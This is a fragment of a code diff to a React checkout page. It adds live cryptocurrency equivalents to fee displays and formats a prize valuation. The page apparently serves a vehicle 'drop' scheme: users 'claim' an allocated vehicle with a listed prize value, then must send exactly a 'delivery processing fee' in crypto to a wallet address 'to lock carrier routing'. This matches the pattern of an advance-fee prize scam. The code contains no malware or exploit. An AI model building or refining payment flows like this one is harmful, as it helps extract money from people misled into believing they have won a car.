-                          : `Confirm Purchase & Reserve Spot · ${formatCleanFee(currentDrop.delivery_fee)}`}
+                          ? `Confirm Claim & Reserve Spot · ${formatFeeDisplay(currentDrop.delivery_fee)} (${currentCryptoCalc.formatted})`
+                          : `Confirm Purchase & Reserve Spot · ${formatFeeDisplay(currentDrop.delivery_fee)} (${currentCryptoCalc.formatted})`}
                         <ArrowRight size={16} className="ml-2" />
                       </>
                     )}
@@ -977,7 +1018,9 @@ function CheckoutPage() {
               <div className="space-y-1">
                 <span className="text-[10px] font-bold uppercase text-muted-foreground">Allocated Vehicle</span>
                 <p className="font-bold text-sm text-foreground">{submittedOrder.drop.name}</p>
-                <p className="text-[11px] text-muted-foreground">Valuation: {submittedOrder.drop.prize_value}</p>
+                <p className="text-[11px] text-muted-foreground">
+                  Valuation: {formatDisplayPrice(submittedOrder.drop.prize_value)}
+                </p>
               </div>
 
               <div className="space-y-1">
@@ -1003,7 +1046,7 @@ function CheckoutPage() {
               </div>
             </div>
 
-            {/* Payment Settlement Information */}
+            {/* Payment Settlement Information with Live Crypto Equivalent */}
             <div className="rounded-xl border-2 border-dashed border-border p-4 flex flex-col sm:flex-row items-center gap-4 bg-background">
               <div className="p-2 rounded-lg bg-white border border-border shrink-0 shadow-2xs">
                 {activeQrImage ? (
@@ -1015,10 +1058,19 @@ function CheckoutPage() {
               <div className="flex-1 min-w-0 space-y-1 text-xs">
                 <div className="flex items-center justify-between">
                   <span className="font-bold text-foreground">Delivery Processing Fee:</span>
-                  <span className="font-mono font-bold text-sm text-foreground">{formatCleanFee(submittedOrder.fee)}</span>
+                  <div className="text-right">
+                    <span className="font-mono font-bold text-sm text-foreground block">
+                      {formatFeeDisplay(submittedOrder.fee)}
+                    </span>
+                    {submittedCryptoCalc && (
+                      <span className="font-mono text-[10px] text-emerald-600 dark:text-emerald-400 font-bold block">
+                        ≈ {submittedCryptoCalc.formatted}
+                      </span>
+                    )}
+                  </div>
                 </div>
                 <p className="text-[10px] text-muted-foreground">
-                  Send exactly {formatCleanFee(submittedOrder.fee)} in {submittedOrder.crypto} to lock carrier routing:
+                  Send exactly {submittedCryptoCalc ? submittedCryptoCalc.formatted : formatFeeDisplay(submittedOrder.fee)} in {submittedOrder.crypto} to lock carrier routing:
                 </p>
                 <p className="font-mono text-[10px] break-all bg-muted p-1.5 rounded text-foreground font-semibold">
                   {submittedOrder.walletAddress}
